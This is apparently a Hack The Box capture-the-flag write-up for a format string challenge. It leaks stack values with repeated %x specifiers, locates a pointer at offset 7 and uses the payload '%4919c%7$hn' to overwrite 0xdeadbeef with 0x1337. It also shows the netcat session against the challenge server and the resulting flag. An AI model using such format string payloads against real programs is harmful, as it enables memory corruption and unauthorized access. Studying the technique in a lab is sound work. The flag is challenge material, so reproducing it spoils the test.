'''
Format String, change deadbeef to dead1337

Insert card's serial number: %x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x

Your card is: a1065f00.b7728c0.0.f.0.deadbeef.a10685a0.252e7825.2e78252e.78252e78.

%4919c%7$hn

0x1337c == 4919
deadbeef -> offset 6 (offset start from 1) 

  local_48 = 0xdeadbeef;
  local_40 = &local_48;

a10685a0 is the address of deadbeef -> offset 7

beef is the lower 16bits -> %h

%n to write to a10685a0, the length is 4919c (chars)

nc 178.128.37.153 30772

1. Scan card
2. Insert password
> 1

[!] Scanning card.. Something is wrong!

Insert card's serial number: %4919c%7$hn

Your card is:
[+] Door opened, you can proceed with the passphrase: HTB{g4t3_0n3_d4rkn3e55_th3_w0rld_0f_p1r4t35}
'''
